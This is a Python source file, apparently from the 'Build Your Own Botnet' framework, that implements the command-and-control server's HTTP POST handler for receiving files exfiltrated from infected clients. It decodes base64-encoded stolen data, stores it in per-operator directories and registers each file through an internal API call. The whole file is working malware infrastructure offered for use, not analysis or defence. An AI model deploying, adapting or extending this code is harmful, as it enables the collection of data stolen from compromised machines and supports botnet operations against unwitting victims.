#!/usr/bin/python
'POST Request Handler (Build Your Own Botnet)'

# standard library
import os
import sys
import json
import string
import base64
import random
import requests

if sys.version_info[0] < 3:
	from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
else:
	from http.server import BaseHTTPRequestHandler, HTTPServer


OUTPUT_DIR = ''


class Handler(BaseHTTPRequestHandler):
	"""
	HTTP POST request handler for clients uploading
	captured images/data to the server
	"""
	def _set_headers(self):
		self.send_response(200)
		self.send_header('Content-type', 'text/html')
		self.end_headers()


	def do_POST(self):
		"""
		Handle incoming HTTP POST request

		"""
		self._set_headers()
		self.data_string = self.rfile.read(int(self.headers['Content-Length']))
		self.send_response(200)
		self.end_headers()

		json_data = json.loads(self.data_string)

		b64_data = json_data.get('data')
		filetype = json_data.get('type')
		owner = json_data.get('owner')
		module = json_data.get('module')
		session = json_data.get('session')
		filename = json_data.get('filename')

		# decode any base64 values
		data = base64.b64decode(b64_data)
		if session.startswith('_b64'):
			session = base64.b64decode(session[6:]).decode('ascii')

		# add . to file extension if necessary
		if not filetype.startswith('.'):
			filetype = '.' + filetype

		# generate random filename if not specified
		if not filename:
			filename = str().join([random.choice(string.lowercase + string.digits) for _ in range(3)]) + filetype

		output_path = os.path.join(OUTPUT_DIR, owner, 'files', filename)

		# add exfiltrated file to database via internal API call
		requests.post("http://0.0.0.0/api/file/add", {"filename": filename, "owner": owner, "module": module, "session": session})

		# save exfiltrated file to user directory
		with open(output_path, 'wb') as fp:
			fp.write(data)


def run(server_class=HTTPServer, handler_class=Handler, port=80):
	httpd = server_class(('0.0.0.0', port), handler_class)
	httpd.serve_forever()


def main():
	global OUTPUT_DIR
	port = int(sys.argv[1])
	OUTPUT_DIR = sys.argv[2]
	run(port=port)


if __name__ == '__main__':
	main()
